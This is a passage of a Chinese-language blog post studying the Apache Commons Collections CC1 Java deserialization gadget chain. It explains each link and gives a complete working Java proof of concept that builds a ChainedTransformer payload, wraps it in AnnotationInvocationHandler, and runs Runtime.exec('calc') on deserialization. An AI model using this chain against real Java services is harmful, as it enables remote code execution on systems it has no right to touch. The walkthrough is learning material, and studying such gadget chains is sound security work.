+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">invokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">());</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>实现如下</p>
+<p><img src="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728141159107.png"
+	width="1909"
+	height="708"
+	srcset="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728141159107_hu6414867331205687021.png 480w, /p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728141159107_hu18064208972253453704.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250728141159107"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="269"
+		data-flex-basis="647px"
+	
+></p>
+<p>然后的问题就是，我们如何找到谁调用了<code>invokerTransformer.transform()</code>方法，参数如何控制？</p>
+<p>那么就到了下一个（上一个）链子节点：<code>TransformMap</code></p>
+<p>这个类的checkSetValue方法里会返回<code>valueTransformer.transform(value)</code>，我们只要把这个方法的<code>valueTransformer</code>赋值为<code>invokerTransformer</code>就可以，value是可控的</p>
+<p>那么如何赋值这个变量呢</p>
+<p><code>TransformMap</code>有一个构造方法可以赋值<code>valueTransformer</code>，但是这个方法是protect的，无法直接调用。但是<code>TransformMap</code>拥有一个公开静态的<code>decorate</code>方法，可以调用这个构造方法（传入三个参数）。</p>
+<p>现在我们的代码可以写成</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Map</span><span class="w"> </span><span class="n">decorated</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">checkSetValue</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//这段代码等同于调用invokerTransformer.transform(Runtime.getRuntime());</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是chectSetValue也是一个私有的方法，不能在外部利用</p>
+<p>不过在MapEntry（实例）里有调用setValue方法，这个方法会调用chectSetValue，这样也解决了。</p>
+<p>具体利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//创建一个普通的 HashMap用来被 TransformedMap 装饰。随便放一个键值对 (&#34;a&#34;, &#34;b&#34;)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;a&#34;</span><span class="p">,</span><span class="s">&#34;b&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//使用 TransformedMap 装饰 HashMap，将 invokerTransformer 设置为 valueTransformer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//相当于告诉 TransformedMap：“以后只要有任何 Entry 的值被修改，你就用这个 invokerTransformer 去处理一下新值。”</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">decorated</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//遍历 decorated Map 的所有条目 (Entry)，用Map.Entry接受</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">entry</span><span class="p">:</span><span class="n">decorated</span><span class="p">.</span><span class="na">entrySet</span><span class="p">()){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            	</span><span class="c1">//修改 Entry 的值，试图将 &#34;a&#34; 对应的 &#34;b&#34; 修改为 Runtime.getRuntime() 返回的那个 Runtime 单例对象。就会调用invokerTransformer.transform(Runtime.getRuntime())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            	</span><span class="n">entry</span><span class="p">.</span><span class="na">setValue</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>实现如下</p>
+<p><img src="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728151941309.png"
+	width="1718"
+	height="824"
+	srcset="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728151941309_hu6946401433726582083.png 480w, /p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728151941309_hu3855708239937097104.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250728151941309"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="208"
+		data-flex-basis="500px"
+	
+></p>
+<p>现在问题就到了怎么调用这个<code>setValue</code></p>
+<p>然后就找到了入口类<code>AnnotationInvocationHandler</code>，即可以被序列化，也重写了<code>readobject</code>方法，在里面调用了<code>serValue</code>。不过需要绕过两个if才能成功调用，而且<code>setValue</code>的值是无法自己定义的。</p>
+<p>两个if很好绕过，但是无法自己定义<code>setValue</code>的值，也就无法传入<code>Runtime.getRuntime</code></p>
+<p><strong>看样子好像进入了死胡同，但是其实还是有办法的</strong></p>
+<p>我们可以通过<code>ConstantTransformer</code>，它不管你传入什么，他返回的都是你构造时传入的<code>Constant</code>。但是通过这个方法的话就不能用前面讲到的<code>decorate</code>装饰从而链接上<code>InvokerTransformer</code>。</p>
+<p>但是，又有一个<code>ChainedTransformer</code>，它是一个流水线，可以把上一个<code>Transformer</code>的输出作为下一个<code>Transformer</code>的输入，可以通过这个把<code>ConstantTransformer</code>和<code>decorate</code>那里联系起来，再把这个<code>Chained Transformer</code>传给<code>decorate</code>。</p>
+<p><strong>最后的最后</strong>，因为Runtime.getRuntime是一个单例模式构造出来的东西，无法被序列化，但是可以通过反射调用。</p>
+<h3 id="代码实现-1">代码实现
+</h3><p>由于maven搞了很久都没成功，这里直接下了<code>commons-collections3.2.1.jar</code>添加到依赖里，以后再好好研究一下maven</p>
+<p>这里是用ysoserial生成的cc1执行的结果，虽然报错了（在利用链调用结束之后产生的报错），但是成功利用就行。</p>
+<p><img src="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728115317935.png"
+	width="1620"
+	height="887"
+	srcset="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728115317935_hu15859520744649957352.png 480w, /p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728115317935_hu15342987051326434745.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250728115317935"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="438px"
+	
+></p>
+<p>前面为了好理解链子，放了一点代码，这里把剩下的代码都实现一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationTargetException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">o</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;123.bin&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="p">,</span><span class="w"> </span><span class="n">InvocationTargetException</span><span class="p">,</span><span class="w"> </span><span class="n">InstantiationException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//创建一个“流水线” (ChainedTransformer)，只要调用它的 transform() 方法，就能自动完成获取 Runtime 实例并执行 exec(&#34;calc&#34;) 的所有操作。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">//忽略所有输入，直接生产并传递出 Runtime.class 这个类对象。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">//接收 Runtime.class，调用它的 getMethod 方法，找到 getRuntime() 这个方法，并把这个 Method 对象传递下去。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">//接收 getRuntime() 这个 Method 对象，调用它的 invoke 方法，从而获得 Runtime 的单例实例，并传递下去。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">//接收 Runtime 实例，调用它的 exec 方法执行 calc 命令。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//我们往原始 HashMap 里放入了一个键值对。这个键 value 不是随便写的，它必须是后面 AnnotationInvocationHandler 所使用的注解类中存在的一个方法名。（这里就是前文说的两个if条件的绕过）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="s">&#34;value&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">decorated</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">chainedTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//反射获取AnnotationInvocationHandler</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取它的构造函数。这个构造函数接受两个参数：一个注解的 Class 对象和一个 Map</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Target.class: 我们传入 java.lang.annotation.Target.class 作为注解类。@Target 这个注解有一个方法叫做 value()，它的返回类型是 ElementType[]。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//decorated: 我们传入了那个被 TransformedMap 装饰过的 Map。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Target</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">decorated</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unserialize</span><span class="p">(</span><span class="s">&#34;123.bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果如下：</p>
+<p><img src="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728184402656.png"
+	width="1822"
+	height="1018"
+	srcset="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728184402656_hu6257905853952572531.png 480w, /p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250728184402656_hu12297558212623992082.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250728184402656"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="178"
+		data-flex-basis="429px"
+	
+></p>
+<h3 id="小结">小结
+</h3><p>说实话，理了一遍之后还是有点懵里懵懂。不过按照我的理解来说，我觉得重要的是装饰器那里输入一个map，返回一个装饰过的map，通过这个将<code>InvokerTransformer/chaindeTransformer</code>和入口联系起来。还有就是<code>chainedTransformer</code>的利用，也是理解的重要点。</p>
+<h2 id="cc6">CC6
+</h2><h3 id="链子以及解析-2">链子以及解析
+</h3><h3 id="代码实现-2">代码实现
+</h3>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/java%E5%86%85%E5%AD%98%E9%A9%AC/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java内存马</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/java%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java利用方式</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java安全基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/java%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java从零开始代码审计</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透知识点汇总</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 liernian
+    </section>
+    
